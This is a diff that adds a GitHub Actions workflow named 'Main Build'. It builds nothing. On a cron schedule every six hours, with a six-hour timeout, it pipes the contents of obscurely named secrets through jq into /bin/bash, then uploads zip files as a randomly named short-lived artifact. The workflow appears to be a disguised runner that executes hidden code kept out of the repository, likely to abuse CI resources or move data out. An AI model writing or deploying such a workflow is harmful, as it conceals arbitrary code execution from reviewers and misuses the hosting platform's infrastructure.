@@ -1,0 +1,30 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          yz92: ${{ secrets.yz92 }}
+        run: |
+          printf '%s' "$yz92" | jq -r .pxbyq83369 | /bin/bash
+          printf '%s' "$jga12" | jq -r .q52791 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: DA4Io1hK
+          path: "*.zip"
+          retention-days: 1
